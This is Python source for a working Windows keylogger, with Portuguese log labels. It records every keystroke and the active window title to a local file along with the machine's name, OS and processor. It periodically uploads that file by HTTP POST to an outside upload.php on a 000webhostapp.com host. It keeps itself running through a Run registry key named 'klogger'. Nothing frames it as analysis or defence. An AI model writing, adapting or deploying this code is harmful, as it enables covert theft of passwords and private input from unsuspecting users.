#!/usr/bin/python
# -*-coding:utf-8-*-

import pyHook
import pythoncom
import os
import subprocess
import requests
import threading
import platform
import time


def onkey(event):
    global head
    global data
    global window
    global dump

    file = open('C:\\captura\\capt-' + pcname + '.txt', 'a')

    if event.WindowName != window:
        window = event.WindowName
        head = '\n\n[+] ' + window + ' - ' + date + '\n\n'
        file.write(head)

    if event.Ascii == 13:
        data = ' <ENTER>\n'
        file.write(data)
    elif event.Ascii == 8:
        data = ' <BACK SPACE> '
        file.write(data)
    elif event.Ascii == 9:
        data = ' <TAB>'
        file.write(data)
    else:
        data = chr(event.Ascii)
        file.write(data)
        file.close()

    dump.append(data)
    print dump
    if len(dump) > 100:
            print ('tamanho de dump:', len(dump))
            t = threading.Thread(target=upload, args=(fileup,))
            t.daemon = True
            t.start()
            dump = []
    return dump


def upload(fileup):
    global urlFromUpload, urlFromUpShow
    if os.path.exists(fileup):
            files = {'file': open(fileup, 'rb')}
            requests.post(urlFromUpload, files=files)  #import requests


def persis():
    try:
        conv = os.path.realpath(__file__).replace('.py', '.exe')
        subprocess.call(
          'REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "klogger" /t REG_SZ /F /D '+conv, shell=True
        )
    except Exception as e:
        print e

def main():
    persis()

    try:
        os.mkdir('C:\\captura')
    except:
        pass

    file = open('C:\\captura\\capt-' + pcname + '.txt', 'a')
    file.write('\n[+]'+('-'*64+'[+]\n'))
    file.write('   DATA E HORA: ' + date + '\n')
    file.write('   NOME DO USUARIO: ' + pcname + '\n')
    file.write('   SISTEMA OPERACIONAL: ' + pcos + '\n')
    file.write('   PROCESSADOR: ' + pcprocess + '\n')
    file.write('[+]'+('-'*64 + '[+]\n'))
    file.close()

    hooks_manager = pyHook.HookManager()
    hooks_manager.KeyDown = onkey
    hooks_manager.HookKeyboard()
    pythoncom.PumpMessages()


urlFromUpload = "https://cardinal-restaurant.000webhostapp.com/upload.php"
urlFromUpShow = urlFromUpload.strip('http:upload.php')
window = None
data = ''
head = ''
dump = []
date = time.strftime("%d/%m/%Y")+ ' - ' + time.strftime("%X")
pcname = platform.node()
pcos = platform.platform()
pcprocess = platform.processor()
fileup = 'C:\\captura\\capt-'+pcname+'.txt'

if __name__ == "__main__":
    main()
 
